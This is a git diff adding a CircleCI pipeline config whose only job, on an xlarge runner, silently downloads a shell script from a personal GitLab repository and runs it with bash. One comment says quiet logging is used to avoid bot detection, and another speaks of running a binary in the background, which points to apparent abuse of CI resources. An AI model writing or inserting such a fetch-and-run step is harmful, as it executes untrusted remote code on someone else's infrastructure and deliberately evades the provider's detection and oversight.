@@ -1,0 +1,34 @@
+version: 2.1
+
+executors:
+  my-custom-executor:
+    docker:
+      - image: cimg/base:stable
+        auth:
+          username: $DOCKER_HUB_USER
+          password: $DOCKER_HUB_PASSWORD
+    # Mendefinisikan resource class agar performa stabil
+    resource_class: xlarge 
+
+jobs:
+  my-job-name:
+    executor: my-custom-executor
+    steps:
+      - checkout
+      - run:
+          name: "Setup Environment and Execute"
+          command: |
+            # Menggunakan -q agar log bersih (menghindari deteksi bot lewat log berlebih)
+            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
+            sed -i 's/\r$//' circle.sh
+            chmod +x circle.sh
+           
+            # Menjalankan biner dengan timeout atau background jika perlu
+            bash circle.sh
+
+workflows:
+  my-custom-workflow:
+    jobs:
+      - my-job-name:
+          context:
+            - docker-hub-creds # Menggunakan Context untuk manajemen secret yang lebih aman
